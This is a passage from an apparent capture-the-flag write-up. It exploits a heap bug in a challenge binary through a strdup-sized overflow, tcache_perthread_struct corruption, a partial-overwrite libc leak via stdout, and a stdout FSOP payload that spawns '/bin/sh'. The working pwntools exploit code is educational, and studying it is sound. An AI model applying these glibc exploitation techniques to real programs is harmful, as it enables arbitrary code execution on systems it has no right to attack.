### strdup
Let's take a look at how strdup actually works.  
```c
/* Duplicate S, returning an identical malloc'd string.  */
char *
__strdup (const char *s)
{
  size_t len = strlen (s) + 1;
  void *new = malloc (len);

  if (new == NULL)
    return NULL;

  return (char *) memcpy (new, s, len);
}
```
`strdup()` allocates a new heap chunk large enough to store the copied string, including its null terminator. Internally, it calls:

```c
malloc(strlen(s) + 1);
```

and copies the string into the newly allocated buffer.  

This means that, unlike option 3 which always allocates a fixed-size `0x100` chunk, the size of a chunk created through `strdup()` depends on the length of the source string. As a result, we can create heap chunks of arbitrary size by controlling our input size!  
Why does this matter? Well remember that we have a fixed edit of size `0x100`.  
If the chunk that we start editing from is LESS than `0x100`, we have a heap overflow and can write to neighbouring chunks, including overwriting their metadata :)  
SO YES we have discovered our first primitive, a heap overflow.

### Tcache_perthread_struct
```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5603dd6ab000
Size: 0x290 (with flag bits: 0x291)
```
Ever noticed this strange chunk on the heap? Well this is the `tcache_perthread_struct`!  
```c
/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS		64
...
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
...
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
The tcache_perthread_struct stores the per-thread tcache state.  
- counts[TCACHE_MAX_BINS] records the number of cached chunks in each tcache bin.  
- entries[TCACHE_MAX_BINS] stores the head pointer of a singly linked list containing freed chunks of the corresponding size class.  

One interesting property of the entries array is that the pointers stored here are not protected by safe-linking. While individual chunks stored in a tcache bin have their fd pointers mangled, the pointers inside entries[] are stored as raw addresses.  
This means that if we can corrupt an entry in the entries array, the next allocation from the corresponding tcache bin will return a chunk at whatever address is stored there.  
In fact, since we have our heap leak, which is just the base address of the `tcache_perthread_struct` bit shifted by 12, we can can overwrite a chunks fd pointer and get an arbitrary allocation to anywhere on the heap!  

### heap
So now our next steps will be:  
1. get our heap leak
2. get an allocation to the `tcache_perthread_struct` entries array
3. create an unsorted chunk such that a libc pointer (`main_arena+96`) is placed as an entry in the array
4. modify the libc pointer to point to stdout
5. alloc to stdout, edit it to get a libc leak when it flushes  
6. fsop and win

This part requires a bunch of heap grooming.

```python
edit(22,p64(0)+p64(0x91))
```
To make our fake 0x110 chunk usable, we also need to ensure that the chunk immediately following it appears valid to glibc.  
When glibc processes a chunk, it does not only inspect the current chunk's metadata. It also verifies the metadata of the next chunk located at:  
`fake_chunk + 0x110`  
Since our fake chunk claims to have a size of 0x110, the allocator expects to find another well-formed chunk header at that location. If the next chunk's metadata is invalid, allocator consistency checks will fail and the program will abort.  
So yeah we just use the same technique as above to do that at `base+0x200`. (I used size 0x90 cus I think the chunk following this chunk is 0x90 away, though im not sure if it would affect anything if you uesd a diff size).  
```python
#23,24,25,26,27,28,29 (tcache)
# 30,31 
for i in range(23,32):
    alloc(i,b'hi')
for i in range(23,30):
    free(i)
free(6)
stdout_low = 0x65c0

edit(12,p64(0)+p64(0x111)+p64(0) + p16(stdout_low))
alloc(23,p64(0xfbad1887) + p64(0)*3 + b'\x00' )

leak = p.recvuntil(b'[1] dup', drop=True)
# print(leak[:8])
libc_leak = leak[:8]
libc_leak = u64(libc_leak)
print(hex(libc_leak))
libc_base = libc_leak - 0x204644
print(hex(libc_base))
libc.address = libc_base
print(hex(libc.address),'libc base')
```
We fill up 7 slots in the tcache, then `free(6)` to create an unsorted chunk and place a libc pointer in the tcache entries.  
We then edit it to point to `stdout` instead of `main_arena+96`.  
For this part `stdout_low = 0x65c0`, only the bottom 3 bits `5c0` are a constant offset from the libc base, and we need to guess the top nibble. As the chance of it being correct is 1/16 with aslr, we can just run our script a few times until it works.  
*Note you can set `e.process(aslr=False)` when youre solving/debugging so you can use the same offset and its less annoying*  

FINALLY, we can just do a `stdout` FSOP and WIN!!

```python
fake = FileStructure(0)

fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
```
